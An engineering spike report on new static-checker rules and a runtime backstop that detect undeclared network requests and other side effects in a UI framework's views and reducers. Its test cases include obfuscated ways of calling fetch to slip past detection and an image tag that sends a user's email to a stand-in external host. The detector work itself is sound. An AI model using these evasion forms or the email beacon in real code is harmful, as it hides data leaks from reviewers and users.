# Undeclared side effects: making "every side effect is a declared output" true

Spike, 2026-11-09, on top of 7.4.1. Nothing published, no paid model runs. It closes gap 2 of `dev-plans/research/thesis/README.md` (branch `claude/spike-thesis-demo-09b7aa`): `fetch()` in a reducer, `fetch()` in an imported helper and `navigator.sendBeacon()` in a view were all clean under `--strict`.

## The result

> **If `sygnal-check --strict` passes, then no code the checker can read in a view, STATE reducer, non-EFFECT sink handler, calculated field, context entry, declaration static or intent, and no project function it can follow from them, makes a network request, writes storage, navigates, starts a timer, posts a message, changes the page or adds a listener through a browser API it can name. No EFFECT handler reaches the network directly. So every effect written in the project's own code in a form the checker can read is either a value returned to a sink or inside an EFFECT entry.**

That is a statement about the code the project wrote, in forms that can be read without running it. It is not "the app has no other effects". The exceptions are in §7. The two that matter most: a call into a package not on the short list, and a function that arrives as a value (from state or a parameter).

| Delivered | Where |
|---|---|
| **SYG265** (error): network request outside a declared output | `sygnal-check/src/rules/syg265-undeclared-effect.js` |
| **SYG266** (warn): any other side effect outside a declared output | same rule |
| **SYG511** (strict, warn): network request in an EFFECT | `sygnal-check/src/rules/strict/syg511-network-in-effect.js` |
| **SYG512** (strict, warn): module-level variable written outside an output | same rule |
| The analysis (kinds, places, helper following, the messages) | `sygnal-check/src/model/effects.js` |
| Tests | `sygnal-check/test/undeclared-effects.vtest.js`, `test/diagnostics-effects.test.js` |
| Dev runtime backstop | `src/extra/diagnostics/checks/effects.ts` |

Results in one place:

| Question | Answer |
|---|---|
| The thesis spike's four samples | **3 of 4 caught.** The fourth is not an effect (§5) |
| False positives, SYG265 / SYG266, on 93 apps + 1,041 doc samples | **0** |
| SYG512 hits on the same set | 3, all real module state, none fixed here (§4) |
| Cost in the core | **0 B**: the size gate is 40,457 B before and after |
| Rule time | 20 ms on the 31-component AI showcase (project build: 84 ms) |

## 1. The rule

**The places.** Code that must not have effects: the view, STATE reducers, every other sink's handler (it *returns* the output; `fetch` inside an HTTP handler is still a hidden request), `calculated`, `context`, the declaration statics (`resources`, `timers`, `connections`, `head`, `route`, `persist`, `browser`, `uses`, `agent`, `initialState`), the intent and its callbacks. Plus the top-level code of a component file, which runs on import, in no output.

**Following.** SYG258 only looks at the handler's own body, which is too shallow here: the thesis sample hides the effect in an imported helper. This rule follows calls, functions handed over as an argument, property or JSX attribute, tags rendered as plain views, getters on literals, and instance and static methods of classes in the project, through relative imports, to any depth (a visited set stops cycles). Nested functions count. A child with statics is checked as itself, not through the tag. It costs 20 ms on the largest example.

An effect in a helper is reported **at the root's call**, with the effect as a `related` location. That keeps the rule per-file (incremental checking works), puts the finding where the reviewer is, and names the path. `// sygnal-ignore` works at either end.

**What counts.**

| Kind | APIs | Code in pure places | Top-level of a component file | In EFFECT |
|---|---|---|---|---|
| network | `fetch`, `XMLHttpRequest`, `navigator.sendBeacon`, `WebSocket`, `EventSource`, `WebTransport`, `RTCPeerConnection`, `new Image()`, a created element's `.src`, `import()` of a URL or a computed value, a call into a listed package (axios, ky, ofetch, posthog-js, @sentry/*, ...) | **SYG265 error** | SYG265 | **SYG511** strict warn |
| storage write | `localStorage` / `sessionStorage` writes, `indexedDB`, `caches`, `cookieStore`, `document.cookie =`, js-cookie, idb, ... | SYG266 warn | SYG266 | allowed |
| navigation | `location` assignment and methods, `history.pushState` etc., `window.open` | SYG266 | SYG266 | allowed |
| message | `postMessage` (any receiver), `BroadcastChannel`, `new Worker` | SYG266 | SYG266 | allowed |
| timer | `setTimeout`, `setInterval`, `requestAnimationFrame`, `queueMicrotask`, their clears | SYG266 | not checked | allowed |
| DOM write, listener | assignment or a mutating method on anything rooted in `document`, `window` or an event's target; `addEventListener`; `window.x =` | SYG266 | not checked | allowed |
| device | clipboard write, `navigator.share`, `vibrate`, `Notification`, geolocation | SYG266 | not checked | allowed |
| dynamic | `eval`, `new Function`, a computed property of a global the checker can't fold | SYG266 | not checked | allowed |
| module state | an assignment, `++`, a property write, a mutating array / Map / Set method on a module-level binding | **SYG512** strict warn | not checked | allowed |

**Not effects.** Reads (`location.href`, `localStorage.getItem`, `navigator.onLine`): they are inputs, not outputs, so they don't belong in an inventory of what a change sends or writes. They do break replay, as `Date.now()` does; that is a separate check if wanted. `console` is exempt: it can't leave the machine, and a debug `console.log` in a view shouldn't fail CI. `e.preventDefault()` is exempt: it has a declared form but is harmless.

**Severities, and why.** Default `--fail-on=warn` means a warning fails `--strict`, so the guarantee doesn't depend on error vs warn. The severity says how sure and how bad:

- **SYG265 is an error**, by default. A request from a view or reducer has no legitimate form, and it is the thing the whole inventory exists to show. Measured 0 hits on all our code. It is a new default-mode error, which is the one decision worth the maintainer's look (§8).
- **SYG266 is a warning.** A timer in a view is usually a bug, not a leak, and DOM-write detection depends on seeing where a value came from.
- **SYG511 is strict-only.** EFFECT is the declared escape hatch, so the effect is visible to tools. `fetch` there still loses the URL from the inventory, aborts, reply actions and test fakes, and llms.txt already forbids it. Non-network work in an EFFECT is what EFFECT is for.
- **SYG512 is strict-only.** Detection is reliable for direct writes and not complete for aliases (§5), and memo-shaped code exists.

Every message names the place, the path and what to do instead: the HTTP sink, `resources`, `connections`, `persist`, `timers` or `next(…, ms)`, `ROUTER`, an `ELEMENT` command, `head`, `browser`, `<Portal>`, a driver sink. `data: { place, kind, action, effects }` is on every report, for the behaviour report to reuse.

**No `--fix`.** None of these is a mechanical rewrite: moving a call to a sink changes when it runs and needs an action, a driver and often a reply. The precedent, SYG258, works because the replacement is the same expression.

## 2. How it was built

`effects.js` is one classifier and one walker. `globalPath` turns an expression into the global it denotes, through `window.` / `globalThis.` / `self.`, literal and foldable computed names, const aliases, destructuring, imports, object-literal properties, `.call` / `.apply` / `.bind`, and `Reflect.get`. A computed key it can't fold on a global object is itself a finding: that form has no legitimate use in these places. A separate root test handles DOM writes (`document`, `window`, `e.target`, or a local bound to one; elements fresh from `createElement` are detached and exempt, except `.src`, which loads at once).

A local `function fetch()` or an imported one is not the global: every check goes through `findBinding`.

## 3. Procedure followed

Codes in both tables of `src/extra/diagnostics/codes.ts`, `sygnal-check/src/codes.js`, explanations and `explanations.json`, `docs/.../reference/errors.md`, one case each in `test/fixtures/ranges/cases.json` and `p7-c2-ranges.vtest.js`. Edits to shared files are one line per list, at the ends, for the merge with the behaviour-report branch (`claude/modest-almeida-601fe1`).

## 4. False positives on real code

`--strict` over each project, counting these four codes.

| Corpus | Size | SYG265 | SYG266 | SYG511 | SYG512 |
|---|---|---|---|---|---|
| `examples/` | 27 apps | 0 | 0 | 0 | 3 |
| `create-sygnal-app/` templates | 10 | 0 | 0 | 0 | 0 |
| `evals/agent-ergonomics/hidden/*/solution*` | 56 | 0 | 0 | 0 | 0 |
| Docs samples (`check-doc-samples.mjs`) | 1,041 | 0 | 0 | 0 | 0 |

Not a clean sheet by accident. The first pass had two classes of false positive, both designed away:

- **Memo caches, 10 SYG512 hits** (8 in examples, 2 in docs samples: `made.set`, `farCache.set`, `schemas.set`, `animated.add`, ...). A Map or Set that the same function reads with `.get` / `.has` is treated as a memo. All 10 are gone; the cost is a Map-based channel with that shape (§7).
- **Page scripts, 4 SYG266 hits** in `browser-tests/src` (`document.addEventListener` at the top level of a test page). Top-level code of a component file is now checked only for network, storage, navigation and messages.

I grepped the examples independently for `fetch(`, `sendBeacon(`, `setTimeout(`, `setInterval(`, `requestAnimationFrame(`, `addEventListener(` and `localStorage.set`: 30 lines. They are in entry files, a widget's `mount`, custom elements, fake servers, a bench harness and an EFFECT helper (I read the ones in `.jsx` / `.tsx` component files; the rest I judged by their file). None is in a view, reducer or static, so the 0 reflects the code rather than a blind rule.

**The 3 SYG512 hits are all module state, not false positives. None is fixed here.**

| Where | What | Verdict |
|---|---|---|
| `examples/ts-example-2048/src/app.tsx:155` | `addTile` increments a module-level `id` from a STATE reducer | **Real violation**: replay doesn't reproduce it. Use `uuid()` or a counter in state |
| `examples/figma-lite/src/App.tsx:146` | the `rows` calculated keeps `lastShapes` / `lastRows` / `lastOut` (a `let` memo in `model.ts`) | Benign memo, but a single-slot one shared across instances: worth an ignore comment with the reason |
| `examples/platformer/src/Game.tsx:68` | `step()` writes `perf` counters behind a bench flag | Instrumentation: an ignore comment |

The docs check still passes: `node scripts/check-doc-samples.mjs` reports 1,041 clean.

For calibration, code outside the requested corpora: `browser-tests/src` gets 0 SYG265, 0 SYG266 and 6 SYG512 (deliberate counters in test components). `test/fixtures` gets 1 SYG266 and 1 SYG512, both from fixtures importing the library's own source by relative path, which real apps don't do.

Caveat on all of this: every corpus is canonical code by us or by agents reading our docs. A real codebase will have more, which is what `// sygnal-ignore` is for. The 0 is evidence about false alarms on canonical code, not a rate.

## 5. The adversarial samples, and trying to fool it

The thesis spike's four, read with `git show`:

| Sample | Before | Now |
|---|---|---|
| a. `fetch()` in an `EFFECT` | 0 warnings | **SYG511** |
| b. `fetch()` in an imported helper called from a STATE reducer | 0 warnings | **SYG265**, at the call, pointing to `metrics.js:2` |
| c. `navigator.sendBeacon()` in the view | 0 warnings; report said "Nothing here needs special attention" | **SYG265** |
| d. writes behind `...VIEW_DEFAULTS` | 0 warnings | **Not caught, correctly**: this is a state-write hiding problem, not an effect. It is the behaviour report's "Writes unknown" case |

Then attacking my own rule. Everything in these tables is a test case.

**Caught statically:**

`globalThis['fe' + 'tch']()`, `const k = 'fe' + 'tch'; globalThis[k]()`, `globalThis[state.x]()` (as a dynamic global), `window['fetch']`, `fetch.call`, `.bind`, `Reflect.apply(fetch, …)`, `Reflect.get(window, x)`, `const g = window; g.fetch()`, `const { sendBeacon: b } = navigator`, `let f; f = fetch`, an imported alias, `{ send: window.fetch }`, `[…].forEach(fetch)`, `eval`, `new Function`, `setTimeout("code")`, `new Image().src`, `document.createElement('img').src`, a callback handed inline to a widget or a package, `Promise.then(() => fetch())`, a Proxy trap written in place, a getter on a literal and in `initialState`, a class instance's method, a static method, a method on an object of helpers, an effect three modules deep through a re-export and a recursion.

**Cannot be caught statically. Written down and asserted as tests, so a change is a decision:**

| Attempt | Why | Backstop sees it? |
|---|---|---|
| `[].constructor.constructor('return fetch')()('/x')` | No syntactic sign of a global. Reflection through a value | Yes |
| A function from state or a parameter: `state.send()`, `const f = state.f` | A value, unknown without running it | Yes |
| A package not on the list: `someSdk.track()`, `wrap(url)` | The checker doesn't read `node_modules`, and most packages are pure | Yes, if the call is synchronous |
| A callback a package calls later | Same | Only if synchronous |
| A method on an unknown receiver: a param's `.go()` | No type information | Yes |
| `Object.defineProperty(o, 'x', { get… })`, a getter behind a value | The definition isn't reached from the read | Yes |
| An `<img src={'https://t.example/?e=' + state.email}>` in the view | It is the view's declared output; the browser makes the request. `<img src={state.avatar}>` is everywhere, so flagging it would be noise | No. Follow-up: the behaviour report should list external literal hosts in markup |
| `App.model = build()`, `defineComponent({ … })` | The model isn't a literal the checker can read, and `defineComponent` isn't discovered | Handlers yes |
| A promise continuation or a later timer inside a third-party call | Runs after the bracket | No |
| A DOM element that came from `DOM.element()`, a ref or a parameter | Only `document`-, `window`- and event-target-rooted writes are recognised | No (element writes aren't trapped) |

## 6. The dev-runtime backstop

Prototyped: `src/extra/diagnostics/checks/effects.ts`, about 110 lines, in the `sygnal/diagnostics` dev entry. While a view or a non-EFFECT handler runs, `fetch`, `XMLHttpRequest`, `sendBeacon`, `WebSocket`, `EventSource`, the Storage methods, `document.cookie`, `pushState` / `replaceState`, the timers and `postMessage` are swapped for wrappers that report SYG265 / SYG266 (once per component, place and API) and call through. They are put back when the code returns, so nothing stays patched and fake timers aren't disturbed.

It catches what the static rule can't read, including `globalThis[['fe','tch'].join('')]`, a package's synchronous call and a function from state. Tested in jsdom; not run in a real browser.

**Size:** `node scripts/size-gate.mjs` after `npm run build`, on this tree and on the same tree with `src/extra/diagnostics` at the base commit: kanban production bundle 40,457 B both times (default build 35,680 B, core alone 20,166 B gzip, all identical). `dist/index.esm.js` has no trace of the traps. The dev entry grows by 5,747 B raw (`diagnostics.esm.js`, 246,002 → 251,749 B), which apps never load in production.

**Limits:**

- Synchronous only. A promise continuation is out of reach.
- Views and handlers only. Calculated fields and declaration statics aren't bracketed: the core runs them outside these two places.
- `location` assignment can't be trapped (unforgeable).
- `next()` is the framework's own timer: it runs with the traps off, via a wrapper around the `next` the handler gets.
- **Known false positive:** `sygnal/three`'s `<Model src>` starts its load while the view runs. It would report `fetch`. Before shipping, its load should run with the traps off.
- **The view bracket is a monkeypatch.** There is no hook around a view, and adding one costs core bytes, so it wraps `Inst.prototype.view`, reached through the InstanceView's private `i`. That's fragile against a core refactor. A test covers it, so a rename fails loudly, but if this ships, a one-line `wrapView` hook would be the honest version: the maintainer's size budget call (§8).

**Assessment:** worth keeping. It is the honest answer to "what about the things static analysis can't see", at no production cost, and it catches the row that matters most (a third-party SDK called synchronously from a view). It doesn't change the guarantee sentence, because it only speaks for the paths a development session actually runs.

## 7. The exceptions to the guarantee

1. **Packages.** A call into a package not on the list, including a callback it invokes. The list is short on purpose. A config option to extend it (`effectModules`) would be cheap and isn't built.
2. **Values.** A function that arrives through a parameter or from state, a method on an unknown receiver, a `Function` made through `.constructor`. Anything with no syntactic sign of the global.
3. **Models and components it can't read.** `App.model = build()`, an entry added by something other than a resolved object or spread, `defineComponent({ … })`.
4. **Declared escape hatches, by design.** EFFECT for everything except the network; custom drivers (declared as a sink, the driver's code is not read); widgets (`defineWidget` `mount` / `update`, `fromReact`, `fromZag`, `<Sandboxed>`); behaviors from packages.
5. **Markup.** `<img src>`, `<iframe>`, `<link>`, `<form action>` and CSS `url()` make requests as the view's declared output.
6. **Code that isn't a component.** An entry file, a driver module, and the top-level code of an imported helper. Component-file top level is checked for network, storage, navigation and messages only.
7. **DOM values of unknown origin.** A write to an element from a ref, `DOM.element()` or a parameter.
8. **SYG512's reach.** A write through a local alias or a parameter, and a Map / Set read with `.get` / `.has` in the same function.
9. **Reads** are not outputs, so they aren't reported. Passing doesn't mean a view is pure in the replay sense.
10. **`// sygnal-ignore`** and the `ignore` config suppress it, as they do everything. A new suppression is visible in a diff, and the behaviour report should flag one.
11. **Files outside the scan** (test files by default, excluded paths).

And it says nothing about whether the logic is right. PR 5 in the thesis demo gets no help from this.

## 8. Provisional decisions (delegated; say if you disagree)

1. **SYG265 is `error` in default mode.** The others warn. Reason: no legitimate form, 0 hits measured. Counter-argument: a new default error can break a user's build on a minor upgrade (dev server overlay, CI). The conservative alternative is warn in default mode and error under `--strict`. **This is the decision I would most like reviewed**; it is one word in `codes.js` plus `severity` in a report if strict-only escalation is preferred.
2. **`console` exempt** everywhere.
3. **Reads exempt.** Storage and location reads aren't reported; this is about outputs.
4. **Network in EFFECT is strict-only** (SYG511), not default. Everything else in an EFFECT is allowed, including `localStorage` and timers, because existing canonical docs show them there and `persist` / `timers` are alternatives rather than the only way.
5. **SYG512 at `warn` under strict**, not `info`, so the guarantee can include it. Cost: three examples need a fix or an ignore before merge, or they stop being strict-clean.
6. **Memo shape exempt** for Map / Set only. A `let` memo is still reported: nothing tells it apart from a counter.
7. **Module-level checks** apply to files that define components, and only for outward kinds. Page wiring at top level is left alone.
8. **`sygnal-ignore` at the effect also suppresses** the report at every call site. One comment in a helper covers its callers.
9. **The package list is fixed** (HTTP clients, storage wrappers, telemetry SDKs), no config yet.
10. **`uses` and `agent` count as pure statics**, with an exemption for a local behavior's own `EFFECT` property.
11. **Numbers.** SYG265/266 sit after SYG262 with a gap of two for concurrent work; SYG511/512 follow SYG510.

## 9. What's left

- Decide §8.1, then fix or annotate the three examples in §4 and teach agents the rule in `llms.txt` / the skill (not touched here: the rule isn't merged yet).
- Have the behaviour report read these findings: an undeclared effect is a line of the inventory, and an `--ignore` of one is too. `data` is shaped for it.
- `<img src>` and friends with a literal external host: an inventory row in the report rather than a lint.
- Real-browser run of the backstop; the `sygnal/three` exemption; `wrapView` if the monkeypatch offends.
